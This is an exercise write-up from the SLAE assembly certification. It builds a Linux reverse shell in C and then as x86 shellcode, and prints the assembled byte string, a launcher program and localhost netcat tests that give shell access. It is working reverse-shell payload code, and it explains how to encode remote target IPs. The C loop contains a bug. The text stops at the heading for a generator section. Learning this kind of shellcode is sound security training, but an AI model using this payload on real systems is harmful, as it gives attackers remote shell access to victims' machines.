# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 14183.

# Exo 2 - Reverse shellcode - Part 1 - C Reverse Shell

### C Reverse Shell - Creation

Reverse shell creation is simpler in a C point of view. First a socket is created, then a connection to the target is done and at last STDIN/STDOUT/STDERR are redirect and execve is run.

The reverse shell starts and ends as the bind shell

```C
int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);

	// NEW THINGS HERE 

	int i;
	for(i = 0; i++; i <3)
		dup2(client, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
```

*Socket *usage is easy to understant using the manual

```C
NAME
       connect - initiate a connection on a socket

SYNOPSIS
       #include <sys/types.h>
       #include <sys/socket.h>

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```

Again a *sockaddr* structure must be created, the only change here is we are using our target IP address. In order to have an C formated IP address, *inet_addr *function is used.

From the manual:
```C
The inet_addr() function converts the Internet host address cp from IPv4 numbers-and-dots notation into binary data in network byte order.
```

### C Reverse Shell - Final code
```C
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    	my_sockaddr.sin_port = htons(4444);

    	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	int i;
	for(i = 0; i++; i <3)
		dup2(my_socket, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}

```
### Testing the reverse shell

First, the C file is compiled.
```
cervoise@slae:~/exam/reverse$ gcc reverse_shell.c -o reverse_shell
```
Then netcat is used to listen on port 444
```
cervoise@slae:~/exam/reverse$ nc -lv 4444
```

And by running the ELF binary, a (local) reverse shell is gain
```
cervoise@slae:~/exam/reverse$ ./reverse_shell 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```

# Exo 2 - Reverse shellcode - Part 2 - Reverse Shellcode

Many part are similar for the reverse shell than for the bind shell:

- Create a socket
- Redirect STDIN/STDOUT/STDERR
- Execve

The only new thing is a call to connect using a different sockaddr_in address.

### Socket

Same code as for the bind shellcode:
`̀``ASM
xor eax, eax
mov al, 0x66
xor ebx, ebx
mov bl, 1

xor ecx, ecx
push ecx
push ebx
push 0x2
mov ecx, esp
int 0x80

mov edi, eax
`̀``

### Connect

Change from the bind shellcode are:
- Connect is called 
- Target IP address must be pushed on the stack

```
$ for elmt in $(locate net.h); do grep SYS_CONNECT $elmt; done
#define SYS_CONNECT	3		/* sys_connect(2)		*/
```

Then IP must be pushed (in little endian). Issue is what if the IP contains a null byte. For localhost, we often use 127.0.0.1 but 127.1.1.1 is also localhost. But for a real remote IP address, this problem must be considered.

Lets imagine the target is 10.0.0.1:
- 11.1.1.2 is put in a register
- 0x01010101 is substracted in the register
- result is 10.0.0.1

This is working very well except if the IP also contain 255 (0xFF) like 10.255.0.1

If the 255 is not the last byte of the IP (and the first byte of our value, because of little endian), we just replace it by 0x01 and the next value is increment two times. The others value are increment only on time

- 10.255.0.1 became 11.0.2.1 and is put into a register
- 0x01 01 02 01 is subtracted in the register
- result is 10.255.0.1

If the 255 is the last byte, we just put it to 1 and we will substracted by 2. Other value are incremented of 1.

- 10.1.0.255 became 11.2.1.1 (0x0101020B) and is put into a register
- 0x02010101 is subtracted in the register
- Result is 0xff00010a (10.1.0.255)

For our test shellcode, 127.1.1.1 (0x0101017F) will be used, this part will be integrated in the final python generator.

```ASM
xor eax, eax
push 0x0101017F
push word 0x5c11
inc ebx	
push word bx
inc ebx
mov edx, esp

mov al, 0x66
push 0x10
push edx
push edi
mov ecx, esp

int 0x80
```

### Dup2

Same code as for the bind shellcode:

```ASM
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop
```

### Execve

Same code as for the bind shellcode:
```ASM
mov al, 0xb
xor ecx, ecx
push ecx,
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor edx, edx
int 0x80
```

### Final shellcode

```ASM
global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax

	;connect
	xor eax, eax
	push 0x0101017F
	push word 0x5c11
	inc ebx	
	push word bx
	inc ebx
	mov edx, esp

	mov al, 0x66
	push 0x10
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx,
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	xor edx, edx
	int 0x80
```

### Compilation

Compilation is done using *nasm*:
```
$ nasm -f elf32 -o reverse_shellcode.o reverse_shellcode.nasm
$ reverse_shellcode.o
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x43\x66\x53\x43\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80"
```

### Execution

Our C shellcode launcher file is:
```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x43\x66\x53\x43\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80";

main() {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Compilation and starting a listner with *netcat* in a first terminal:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ nc -lv 4444
```

And access to the bind shell in antoher terminal:
```
$ ./shellcode 
Shellcode Length:  79
```

Reverse shell is open in the first terminal:

```
$ nc -lv 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

# Exo 2 - Reverse shellcode - Part 3 - Reverse Shellcode Generator
